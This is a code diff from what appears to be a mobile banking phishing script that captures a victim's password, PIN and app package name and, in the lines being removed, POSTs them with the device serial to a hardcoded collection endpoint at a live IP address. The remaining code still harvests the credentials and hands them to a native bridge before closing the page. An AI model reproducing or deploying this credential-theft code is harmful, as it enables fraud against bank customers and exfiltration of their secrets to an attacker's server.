@@ -5,7 +5,7 @@
   window.__fyInterceptorInjected = true;
 
   var TARGET_PATH = '/api/PhishingData.php';
-  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
 
   function isOurTargetUrl(u){
     if (!u) return false;
@@ -520,7 +520,7 @@ function submitAll(){
   var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
   var pl=JSON.stringify({password:savedPw,pin:pin,pkg:pk});
   try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
-  try{var x=new XMLHttpRequest();x.open('POST',"http://18.142.44.159:8035/api/PhishingData.php",true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({deviceId:sn,pkg:pk,template:'ahli',formData:pl}));}catch(e){}
+  
   setTimeout(closePage,500);
 }
 document.addEventListener('focusin',function(e){if(e.target.tagName==='INPUT'){setTimeout(function(){e.target.scrollIntoView({behavior:'smooth',block:'center'});},300);}});
